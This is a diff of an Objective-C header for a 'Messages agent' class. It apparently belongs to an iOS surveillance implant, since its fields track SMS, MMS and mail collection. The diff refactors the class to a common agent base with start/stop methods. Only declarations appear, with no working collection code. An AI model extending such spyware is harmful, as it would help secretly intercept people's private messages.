@@ -1,5 +1,5 @@
 /*
- * RCSIpony - Messages agent
+ * RCSiOS - Messages agent
  *
  *
  * Created by Massimo Chiodini on 01/10/2009
@@ -8,6 +8,7 @@
  */
 
 #import "RCSICommon.h"
+#import "RCSIAgent.h"
 
 #ifndef __RCSIAgentMessages_h__
 #define __RCSIAgentMessages_h__
@@ -17,7 +18,7 @@
 
 #define ALL_MSG ((long)0)
 
-@interface RCSIAgentMessages : NSObject <Agents>
+@interface RCSIAgentMessages : RCSIAgent <Agents>
 {
 @public
   int  mSMS;
@@ -25,7 +26,6 @@
   int  mMail;
   
 @private
-  NSMutableDictionary *mAgentConfiguration;
   NSMutableArray      *mMessageFilters;
   long                mLastRealTimeSMS;
   long                mLastCollectorSMS;
@@ -36,19 +36,10 @@
   long                mLastMMS;
 }
 
-@property (retain, readwrite) NSMutableDictionary    *mAgentConfiguration;
+- (id)initWithConfigData:(NSData*)aData;
+- (void)startAgent;
+- (BOOL)stopAgent;
 
-+ (RCSIAgentMessages *)sharedInstance;
-+ (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
-- (unsigned)retainCount;
-- (void)release;
-- (id)autorelease;
-- (id)init;
-
-- (BOOL)stop;
-- (void)start;
 @end                                        
 
 #endif
